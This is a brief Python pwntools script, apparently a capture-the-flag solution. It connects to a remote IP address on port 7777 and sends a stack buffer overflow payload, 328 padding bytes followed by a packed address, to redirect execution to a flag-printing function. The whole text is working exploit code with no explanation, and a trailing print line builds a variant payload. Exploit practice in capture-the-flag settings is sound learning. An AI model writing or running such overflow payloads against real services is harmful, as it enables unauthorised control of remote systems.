from pwn import*
p=remote("111.230.240.83",7777)
flag_addr=0x400ca0
p.recvuntil("flag:")
p.sendline('a'*328+p64(flag_addr))
p.interactive()
print 'bbbb'+'a'*324+p64(0x400ca0)

